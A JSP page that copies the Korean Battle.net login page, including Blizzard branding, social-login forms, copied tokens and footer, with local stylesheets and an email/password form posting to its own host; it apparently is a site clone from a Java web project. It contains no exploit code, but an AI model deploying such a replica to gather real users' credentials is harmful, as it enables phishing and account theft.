
<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="ko-kr" xml:lang="ko-kr"
	class="ko-kr bnet-next">
<head xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#">
<meta http-equiv="imagetoolbar" content="false" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<title>Battle.net 계정 로그인</title>
<link rel="apple-touch-icon" sizes="57x57"
	href="/login/static/images/toolkit/themes/bnet-next/meta/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60"
	href="/login/static/images/toolkit/themes/bnet-next/meta/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72"
	href="/login/static/images/toolkit/themes/bnet-next/meta/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76"
	href="/login/static/images/toolkit/themes/bnet-next/meta/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114"
	href="/login/static/images/toolkit/themes/bnet-next/meta/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120"
	href="/login/static/images/toolkit/themes/bnet-next/meta/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144"
	href="/login/static/images/toolkit/themes/bnet-next/meta/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152"
	href="/login/static/images/toolkit/themes/bnet-next/meta/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180"
	href="/login/static/images/toolkit/themes/bnet-next/meta/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="192x192"
	href="/login/static/images/toolkit/themes/bnet-next/meta/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="16x16"
	href="/login/static/images/toolkit/themes/bnet-next/meta/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32"
	href="/login/static/images/toolkit/themes/bnet-next/meta/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96"
	href="/login/static/images/toolkit/themes/bnet-next/meta/favicon-96x96.png">
<link rel="mask-icon"
	href="/login/static/images/toolkit/themes/bnet-next/meta/safari-pinned-tab.svg"
	color="#148eff">
<meta name="msapplication-TileColor" content="#1c1e26">
<meta name="msapplication-TileImage"
	content="/login/static/images/toolkit/themes/bnet-next/meta/ms-icon-150x150.png">
<meta name="theme-color" content="#1c1e26">
<script nonce="qYWJZr4r86" type="text/javascript">
var BlzCookieConsent = {
host: 'battle.net',
onetrustScriptUrl: '',
onetrustDomainScript: '',
whitelistedCookies: ['']
}
</script>
<link rel="stylesheet" type="text/css" media="all"
	href="./resources/css/login/global.css" />
<link rel="stylesheet" type="text/css" media="all"
	href="./resources/css/login/nav-client.css" />
<link rel="stylesheet" type="text/css" media="all"
	href="./resources/css/login/logo_pic.css" />
<script src="https://kit.fontawesome.com/2c3a00978e.js"
	crossorigin="anonymous"></script>
<link rel="stylesheet" type="text/css" media="(max-width:800px)"
	href="./resources/css/login/nav-client-responsive.css" />
<meta name="viewport" content="width=device-width" />
<meta property="og:image"
	content="/login/static/images/meta/opengraph.png?v=58-1" />
<meta property="og:image:type" content="image/png" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:image:alt" content="배경이 있는 Battle.net 로고" />
</head>
<body
	class="kr ko-kr login-template blz web bnet-next tk-bnet-next ce-standalone-browser "
	data-embedded-state="STATE_LOGIN" data-baseUrl="/login/ko"
	data-cdnUrl="//akamai-http.web.blizzard.net/content"
	data-staticUrl="/login/static"
	data-sharedStaticUrl="/login/static/local-common"
	data-secureSupportUrl="https://kr.battle.net/support/"
	data-project="login" data-projectUrl="/login" data-locale="ko-kr"
	data-language="ko" data-region="kr" data-loggedIn="false"
	data-userAgent="web" data-client-environment="standalone-browser"
	data-autofocus-enabled="true" data-tagManagerAccount="GTM-589KTQ"
	data-gtmDataLayer="[{'userAgent':'web','analyticsRequestUri':'/login/ko/','theme':'bnet-next','errorCode':'','state':'STATE_LOGIN'}]"
	data-nonce="qYWJZr4r86"
	data-srp-script-url="//bnetaccount.akamaized.net/login/static/js/login/0.srp6a-routines.worker.1PBfF.js"
	data-pw-v2-worker-url="//bnetaccount.akamaized.net/login/static/js/login/upgrade-verifier.worker.39zo7.js"
	data-v2-password-js="//bnetaccount.akamaized.net/login/static/js/login/account-password.0702N.js"
	data-scrollbar="false"
	data-network-error-message="네트워크 연결을 확인하고 다시 시도해 주세요.">
	<script nonce="qYWJZr4r86" type="text/javascript">
"use strict";
!function(r){var t="/login/error-report";function o(e,n,r){void 0!==n[r]&&(e[r]=n[r])}function a(){var e,n;return{system:function(){var e={};e.clientTimeMillis=Date.now();var n=r.navigator;return o(e,n,"oscpu"),o(e,n,"hardwareConcurrency"),o(e,n,"deviceMemory"),e}(),network:(e={},void 0!==(n=r.navigator.connection)&&(o(e,n,"downlink"),o(e,n,"downlinkMax"),o(e,n,"effectiveType"),o(e,n,"rtt"),o(e,n,"type")),e),browser:function(){var e={};o(e,r&&r.location,"href"),o(e,window,"devicePixelRatio"),o(e,window,"innerHeight"),o(e,window,"innerWidth");var n=r.navigator;return o(e,n,"platform"),o(e,n,"userAgent"),o(e,n,"language"),o(e,n,"cookieEnabled"),e}()}}function e(e,n,r,o,i){i={message:e,source:n,lineno:r,colno:o,stack:(void 0===(o=i)?{}:o).stack};o={environment:a(),error:i},(i=new XMLHttpRequest).open("POST",t),i.setRequestHeader("Content-Type","application/json"),i.setRequestHeader("Accept","application/json"),i.addEventListener("error",function(e){console.error("An error occurred while sending an error-report. Error: "+e)}),i.send(JSON.stringify(o))}void 0!==r?(r.onerror=e,r.errorReporter={global:e}):console.error('Unable to bind onError listener as "window" was undefined.')}(window,document);
</script>
	<script type="text/javascript"
		src="//bnetaccount.akamaized.net/login/static/js/login/analytics.0HTGj.js?v=58-1"></script>
	<div class="grid-container wrapper">
		<div class="box-wrapper ">
			<div class="box-wrapper-inner">
				<h1 class="logo logo-horizontal logo-small"">Battle.net 계정 로그인
				</h1>
				<div class="hide" id="info-wrapper">
					<h2>
						<strong class="info-title"></strong>
					</h2>
					<p class="info-body"></p>
					<button class="btn btn-block hide visible-phone"
						id="info-phone-close">닫기</button>
				</div>
				<div class="input" id="login-wrapper">
					<div class="login">
						<!-- Default layout for third party form -->
						<!-- Default layout -->
						<h3 id="login-header">로그인</h3>
						<div class="useResponse social-login external-login-container">
							<form method="post" action="/login/signin/google"
								id="googleLogin"
								class="class org.apache.maven.project.MavenProject" enctype="">
								<button id="google" role="row"
									class="btn btn-block third-party-login social-icon login-google"
									rel="external" aria-label="Google 계정으로 로그인"
									title="Google 계정으로 로그인" tabindex="0">
									<i class="icon-google"></i>
								</button>
								<input type="hidden" name="scope" value="openid,profile,email" />
								<input type="hidden" name="ref"
									value="https://play.blizzard.kr/ko/overwatch2/snowshop5-invasion" />
								<input type="hidden" name="app" value="blz" /> <input
									type="hidden" name="scheme" value="" /> <input type="hidden"
									name="deviceProof" value="" /> <input type="hidden"
									id="csrftoken-googleLogin" class="csrftoken" name="csrftoken"
									value="bd8cde73-7c96-4cc4-be2d-1ca2e4f4d328" />
							</form>
							<form method="post" action="/login/signin/facebook"
								id="facebookLogin"
								class="class org.apache.maven.project.MavenProject" enctype="">
								<button id="facebook" role="row"
									class="btn btn-block third-party-login social-icon login-facebook"
									rel="external" aria-label="Facebook 계정으로 로그인"
									title="Facebook 계정으로 로그인" tabindex="0">
									<i class="icon-facebook"></i>
								</button>
								<input type="hidden" name="scope"
									value="public_profile,email,user_friends" /> <input
									type="hidden" name="ref"
									value="https://play.blizzard.kr/ko/overwatch2/snowshop5-invasion" />
								<input type="hidden" name="app" value="blz" /> <input
									type="hidden" name="scheme" value="" /> <input type="hidden"
									name="deviceProof" value="" /> <input type="hidden"
									id="csrftoken-facebookLogin" class="csrftoken" name="csrftoken"
									value="bd8cde73-7c96-4cc4-be2d-1ca2e4f4d328" />
							</form>
							<form method="post" action="/login/signin/apple" id="appleLogin"
								class="class org.apache.maven.project.MavenProject" enctype="">
								<button id="apple" role="row"
									class="btn btn-block third-party-login social-icon login-apple"
									rel="external" aria-label="Apple 계정으로 로그인"
									title="Apple 계정으로 로그인" tabindex="0">
									<i class="icon-apple"></i>
								</button>
								<input type="hidden" name="scope" value="email,name" /> <input
									type="hidden" name="ref"
									value="https://play.blizzard.kr/ko/overwatch2/snowshop5-invasion" />
								<input type="hidden" name="app" value="blz" /> <input
									type="hidden" name="scheme" value="" /> <input type="hidden"
									name="deviceProof" value="" /> <input type="hidden"
									id="csrftoken-appleLogin" class="csrftoken" name="csrftoken"
									value="bd8cde73-7c96-4cc4-be2d-1ca2e4f4d328" />
							</form>
						</div>
						<div class="useResponse social-login external-login-container">
							<form method="post" action="/login/signin/live" id="liveLogin"
								class="class org.apache.maven.project.MavenProject" enctype="">
								<button id="live" role="row"
									class="btn btn-block third-party-login social-icon login-live"
									rel="external" aria-label="Xbox Network 계정으로 로그인"
									title="Xbox Network 계정으로 로그인" tabindex="0">
									<i class="icon-live"></i>
								</button>
								<input type="hidden" name="scope" value="Xboxlive.signin" /> <input
									type="hidden" name="ref"
									value="https://play.blizzard.kr/ko/overwatch2/snowshop5-invasion" />
								<input type="hidden" name="app" value="blz" /> <input
									type="hidden" name="scheme" value="" /> <input type="hidden"
									name="deviceProof" value="" /> <input type="hidden"
									id="csrftoken-liveLogin" class="csrftoken" name="csrftoken"
									value="bd8cde73-7c96-4cc4-be2d-1ca2e4f4d328" />
							</form>
							<form method="post" action="/login/signin/psn" id="psnLogin"
								class="class org.apache.maven.project.MavenProject" enctype="">
								<button id="psn" role="row"
									class="btn btn-block third-party-login social-icon login-psn"
									rel="external" aria-label="PlayStation™Network 계정으로 로그인"
									title="PlayStation™Network 계정으로 로그인" tabindex="0">
									<i class="icon-psn"></i>
								</button>
								<input type="hidden" name="scope" value="psn:s2s" /> <input
									type="hidden" name="ref"
									value="https://play.blizzard.kr/ko/overwatch2/snowshop5-invasion" />
								<input type="hidden" name="app" value="blz" /> <input
									type="hidden" name="scheme" value="" /> <input type="hidden"
									name="deviceProof" value="" /> <input type="hidden"
									id="csrftoken-psnLogin" class="csrftoken" name="csrftoken"
									value="bd8cde73-7c96-4cc4-be2d-1ca2e4f4d328" />
							</form>
							<form method="post" action="/login/signin/nintendo"
								id="nintendoLogin"
								class="class org.apache.maven.project.MavenProject" enctype="">
								<button id="nintendo" role="row"
									class="btn btn-block third-party-login social-icon login-nintendo"
									rel="external" aria-label="Nintendo 계정으로 로그인"
									title="Nintendo 계정으로 로그인" tabindex="0">
									<i class="icon-nintendo"></i>
								</button>
								<input type="hidden" name="scope"
									value="openid,offline,user.basic,user.email" /> <input
									type="hidden" name="ref"
									value="https://play.blizzard.kr/ko/overwatch2/snowshop5-invasion" />
								<input type="hidden" name="app" value="blz" /> <input
									type="hidden" name="scheme" value="" /> <input type="hidden"
									name="deviceProof" value="" /> <input type="hidden"
									id="csrftoken-nintendoLogin" class="csrftoken" name="csrftoken"
									value="bd8cde73-7c96-4cc4-be2d-1ca2e4f4d328" />
							</form>
							<form method="post" action="/login/signin/steam" id="steamLogin"
								class="class org.apache.maven.project.MavenProject" enctype="">
								<button id="steam" role="row"
									class="btn btn-block third-party-login social-icon login-steam"
									rel="external" aria-label="steam 계정으로 로그인"
									title="steam 계정으로 로그인" tabindex="0">
									<i class="icon-steam"></i>
								</button>
								<input type="hidden" name="scope" value="" /> <input
									type="hidden" name="ref"
									value="https://play.blizzard.kr/ko/overwatch2/snowshop5-invasion" />
								<input type="hidden" name="app" value="blz" /> <input
									type="hidden" name="scheme" value="" /> <input type="hidden"
									name="deviceProof" value="" /> <input type="hidden"
									id="csrftoken-steamLogin" class="csrftoken" name="csrftoken"
									value="bd8cde73-7c96-4cc4-be2d-1ca2e4f4d328" />
							</form>
						</div>
						<div class="thirdparty-line">
							<span>또는</span>
						</div>
						<!-- Phoenix specific layout -->
						<form action="" method="post" id="password-form"
							novalidate="novalidate"
							class="
username-required
input-focus
form-with-captcha">
							<div id="login-input-container" class="">
								<div id="js-errors" class="alert alert-error alert-icon hide"
									role="alert" aria-relevant="additions removals"
									data-support-aria="오류 관련 고객지원 링크로 이동합니다.(외부 링크)">
									<p id="cookie-check" class="hide">브라우저의 쿠키가 차단되어있습니다. 계속하려면
										쿠키를 허용하여 주십시오.</p>
								</div>
								<noscript>
									<div id="javascript-disabled"
										class="alert alert-error alert-icon"></div>
								</noscript>
								<div class="control-group ">
									<label id="accountName-label" class="control-label"
										for="accountName">﻿이메일 또는 휴대전화번호</label>
									<div class="controls">
										<input id="accountName"
											aria-label="이메일 또는 휴대전화번호 영역, 이메일 또는 휴대전화번호를 입력하세요"
											name="accountName" title="﻿이메일 또는 휴대전화번호" maxlength="320"
											type="text" tabindex="0" class="input-block "
											placeholder="﻿이메일 또는 휴대전화번호" autocorrect="off"
											spellcheck="false" /> <span class="input-after"></span> <span
											class="error-helper error-helper-accountName hide"> </span>
									</div>
								</div>
								<div class="control-group ">
									<label id="password-label" class="control-label" for="password">비밀번호</label>
									<div class="controls">
										<input id="password" aria-label="비밀번호 영역, 비밀번호를 입력하세요"
											name="password" title="비밀번호" maxlength="128" type="password"
											tabindex="0" class="input-block " autocomplete="off"
											placeholder="비밀번호" autocorrect="off" spellcheck="false"
											data-password-show-aria="비밀번호 표시"
											data-password-hide-aria="비밀번호 숨기기" /> <span
											class="input-after"></span> <span
											class="error-helper error-helper-password hide"> </span>
									</div>
								</div>
								<input type="hidden" id="srpEnabled" name="srpEnabled"
									value="true" /> <input type="hidden" id="upgradeVerifier"
									name="upgradeVerifier" value="" /> <input type="hidden"
									id="useSrp" name="useSrp" value="false" /> <input
									type="hidden" id="publicA" name="publicA" value="" /> <input
									type="hidden" id="clientEvidenceM1" name="clientEvidenceM1"
									value="" />
								<div class="persistWrapper">
									<label id="persistLogin-label"
										class="checkbox-label css-label hide" for="persistLogin">
										<input aria-labelledby="persistLogin-label" id="persistLogin"
										name="persistLogin" type="checkbox" checked="checked"
										tabindex="0" /> <span class="input-checkbox"></span> 로그인 상태
										유지하기
									</label>
								</div>
							</div>
							<div class="control-group submit no-cancel">
								<button type="submit" id="submit"
									class="btn-block btn btn-primary submit-button btn-block "
									data-loading-text="" tabindex="0" aria-label="로그인">
									로그인 <i class="spinner-battlenet"></i>
								</button>
							</div>
							<input type="hidden" id="csrftoken" class="csrftoken"
								name="csrftoken" value="bd8cde73-7c96-4cc4-be2d-1ca2e4f4d328" />
							<input type="hidden" id="sessionTimeout" name="sessionTimeout"
								value="1693055987404" /> <input type="hidden" name="deviceProof"
								value="" />
						</form>
						<!-- Phoenix specific layout for third party form -->
						<ul id="help-links" role="navigation">
							<li role="link"><a rel="internal"
								href="https://account.battle.net/creation/?ref=https://play.blizzard.kr/ko/overwatch2/snowshop5-invasion&amp;theme=bnet-next&amp;app=blz&amp;hostingApp=blz&amp;flowTrackingId=0e96a6d6-b135-43f5-9401-0f53daaff438"
								tabindex="0" id="signup" role="button"> Battle.net 무료 회원
									가입 </a></li>
							<li role="link"><a rel="internal" target="_blank"
								href="https://account.battle.net/recovery/?ref=&amp;theme=bnet-next&amp;app=blz&amp;hostingApp=blz&amp;flowTrackingId=0e96a6d6-b135-43f5-9401-0f53daaff438"
								tabindex="0" id="loginSupport" role="button"> 로그인 문제 해결 <svg
										xmlns="http://www.w3.org/2000/svg" height="10px"
										fill="#148eff" viewBox="0 0 512 512">
										<!--! Font Awesome Free 6.4.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. -->
										<path
											d="M320 0c-17.7 0-32 14.3-32 32s14.3 32 32 32h82.7L201.4 265.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L448 109.3V192c0 17.7 14.3 32 32 32s32-14.3 32-32V32c0-17.7-14.3-32-32-32H320zM80 32C35.8 32 0 67.8 0 112V432c0 44.2 35.8 80 80 80H400c44.2 0 80-35.8 80-80V320c0-17.7-14.3-32-32-32s-32 14.3-32 32V432c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16H192c17.7 0 32-14.3 32-32s-14.3-32-32-32H80z" /></svg>
							</a></li>
							<li role="link"><a rel="internal" target="_blank"
								href="https://account.battle.net/recovery/retrieve/index.html?ref=https://play.blizzard.kr/ko/overwatch2/snowshop5-invasion&amp;theme=bnet-next&amp;app=blz&amp;hostingApp=blz&amp;flowTrackingId=0e96a6d6-b135-43f5-9401-0f53daaff438"
								tabindex="0" id="retrieveAccount" role="button"> 탈퇴한 계정 복구
									<svg xmlns="http://www.w3.org/2000/svg" height="10px"
										fill="#148eff" viewBox="0 0 512 512">
										<!--! Font Awesome Free 6.4.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. -->
										<path
											d="M320 0c-17.7 0-32 14.3-32 32s14.3 32 32 32h82.7L201.4 265.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L448 109.3V192c0 17.7 14.3 32 32 32s32-14.3 32-32V32c0-17.7-14.3-32-32-32H320zM80 32C35.8 32 0 67.8 0 112V432c0 44.2 35.8 80 80 80H400c44.2 0 80-35.8 80-80V320c0-17.7-14.3-32-32-32s-32 14.3-32 32V432c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16H192c17.7 0 32-14.3 32-32s-14.3-32-32-32H80z" /></svg>
							</a></li>
						</ul>
					</div>
				</div>
			</div>
		</div>
		<script nonce="qYWJZr4r86" type="text/javascript">
(function() {
if (!window.BDP) {
window.BDP = [];
}
window.BDP.push(
function(lib, e) {
if (e == null) {
lib.bind(
document.querySelectorAll('form button'),
document.querySelectorAll('input[name="deviceProof"]'),
document.querySelectorAll('a#signup'),
'ba'
);
}
}
);
})();
</script>
		<img
			src="//bnetaccount.akamaized.net/login/static/images/toolkit/themes/bnet/icons/sprite-24-red.0PPlX.png"
			class="hide" /> <img
			src="//bnetaccount.akamaized.net/login/static/images/toolkit/themes/bnet/spinners/spinner-battlenet.1IdwV.png"
			class="hide" />
		<footer id="footer" class="footer ko-kr">
			<div id="nav-client-footer" class="nav-client">
				<div
					class="mobileFooterEnabled footer-content footer-desktop grid-container">
					<div class="nav-section support-feedback">
						<div class="nav-left">
							<div id="nav-feedback"></div>
						</div>
					</div>
					<div class="nav-section">
						<div class="nav-left nav-logo-group">
							<div class="footer-links nav-left">
								<a class="nav-item nav-a"
									href="https://www.blizzard.com/company/legal/eula"
									data-analytics="global-nav"
									data-analytics-placement="Footer - eula">Blizzard 최종 사용자
									라이선스 계약</a> <span>|</span> <a
									class="nav-item nav-a footer-links-snowflake"
									href="https://www.blizzard.com/company/about/privacy.html"
									data-analytics="global-nav"
									data-analytics-placement="Footer - Privacy">개인정보 처리방침</a> <span>|</span>
								<a class="nav-item nav-a"
									href="https://www.blizzard.com/company/legal/"
									data-analytics="global-nav"
									data-analytics-placement="Footer - Terms">이용 약관</a> <span>|</span>
								<a class="nav-item nav-a"
									href="https://kr.blizzard.com/company/about/infringementnotice.html"
									data-analytics="global-nav"
									data-analytics-placement="Footer - copyright">저작권 고지</a> <span>|</span>
								<a class="nav-item nav-a" href="/login/cookies"
									data-analytics="global-nav"
									data-analytics-placement="Footer - Cookies">쿠키</a> <span>|</span>
								<a class="nav-item nav-a" href="/login/cookies#settings"
									data-analytics="global-nav"
									data-analytics-placement="Footer - Cookie Settings">쿠키 설정</a>
								<div class="copyright">©2023 Blizzard Entertainment, Inc.
									모든 권리는 Blizzard Entertainment에 있습니다.</div>
								<div class="nav-footer-icon-container">
									<ul class="nav-footer-icon-list">
									</ul>
								</div>
							</div>
						</div>
						<div class="company-info-container">
							<div class="company-info">
								블리자드 엔터테인먼트 유한 회사<br />주소: 06164 서울시 강남구 테헤란로 521 파르나스타워 15층<br />대표
								번호: 1644-0727 | 팩스 번호: (02)544-3038 | 이메일: <a
									href="https://kr.battle.net/support/ko/">websupport@blizzard.co.kr</a><br />사업자
								등록 번호: 211-87-49910 | 통신 판매업 신고 번호: 강남-6017호 | <a
									href="http://www.ftc.go.kr/bizCommPop.do?wrkr_no=2118749910">사업자정보확인</a><br />대표이사:
								다니엘 알레그레 | 개인정보 보호책임자: 이강호
							</div>
						</div>
						<div class="nav-ratings"></div>
					</div>
				</div>
				<div
					class="mobileFooterEnabled footer-content footer-mobile grid-container">
					<div class="nav-logo-group">
						<div class="footer-links">
							<a class="nav-item nav-a"
								href="https://www.blizzard.com/company/legal/eula"
								data-analytics="global-nav"
								data-analytics-placement="Footer - eula">Blizzard 최종 사용자
								라이선스 계약</a> <span>|</span> <a
								class="nav-item nav-a footer-links-snowflake"
								href="https://www.blizzard.com/company/about/privacy.html"
								data-analytics="global-nav"
								data-analytics-placement="Footer - Privacy">개인정보 처리방침</a> <span>|</span>
							<a class="nav-item nav-a"
								href="https://www.blizzard.com/company/legal/"
								data-analytics="global-nav"
								data-analytics-placement="Footer - Terms">이용 약관</a> <span>|</span>
							<a class="nav-item nav-a"
								href="https://kr.blizzard.com/company/about/infringementnotice.html"
								data-analytics="global-nav"
								data-analytics-placement="Footer - copyright">저작권 고지</a> <span>|</span>
							<a class="nav-item nav-a" href="/login/cookies"
								data-analytics="global-nav"
								data-analytics-placement="Footer - Cookies">쿠키</a> <span>|</span>
							<a class="nav-item nav-a" href="/login/cookies#settings"
								data-analytics="global-nav"
								data-analytics-placement="Footer - Cookie Settings">쿠키 설정</a>
						</div>
						<div class="copyright">©2023 Blizzard Entertainment, Inc. 모든
							권리는 Blizzard Entertainment에 있습니다.</div>
						<div class="nav-footer-icon-container">
							<ul class="nav-footer-icon-list">
							</ul>
						</div>
						<div class="company-info-container">
							<div class="company-info">
								블리자드 엔터테인먼트 유한 회사<br />주소: 06164 서울시 강남구 테헤란로 521 파르나스타워 15층<br />대표
								번호: 1644-0727 | 팩스 번호: (02)544-3038 | 이메일: <a
									href="https://kr.battle.net/support/ko/">websupport@blizzard.co.kr</a><br />사업자
								등록 번호: 211-87-49910 | 통신 판매업 신고 번호: 강남-6017호 | <a
									href="http://www.ftc.go.kr/bizCommPop.do?wrkr_no=2118749910">사업자정보확인</a><br />대표이사:
								다니엘 알레그레 | 개인정보 보호책임자: 이강호
							</div>
						</div>
						<div class="nav-ratings"></div>
					</div>
				</div>
			</div>
		</footer>
	</div>
</body>
</html>